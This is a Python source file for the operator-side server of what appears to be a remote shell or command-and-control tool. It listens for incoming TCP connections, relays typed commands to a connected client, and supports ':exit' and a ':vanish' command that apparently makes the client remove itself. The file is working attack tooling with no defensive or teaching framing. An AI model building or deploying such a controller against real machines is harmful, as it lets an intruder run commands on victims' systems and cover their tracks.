import socket
import subprocess
import time
import os
import base64
import src.shared.comms

class Server(object):
    def __init__(self, host, port):
        self.__comms = src.shared.comms.Server(host, port)
        self.__comms.bind_and_listen()
        print('Listening for incoming TCP connections on: ' + host + ':' + str(port))

    def accept(self):
        addr = self.__comms.accept()
        print('Got a connection from: ' + str(addr))

    def execCmdLoop(self):
        while True:
            cmd = ''
            received = self.__comms.recv().decode()
            while cmd == '':
                cmd = input(received)

            if cmd == ':exit':
                self.__comms.send(':exit')
                print(self.__comms.recv().decode()+'\n')
                print('Shutting down server...')
                os._exit(0)
            elif cmd == ':vanish':
                self.__comms.send(':vanish')
                print(self.__comms.recv().decode()+'\n')
                break
            else:
                self.__comms.send(cmd)


if __name__ == '__main__':
    s = Server('127.0.0.1', 8080)
    while True:
        s.accept()
        s.execCmdLoop()
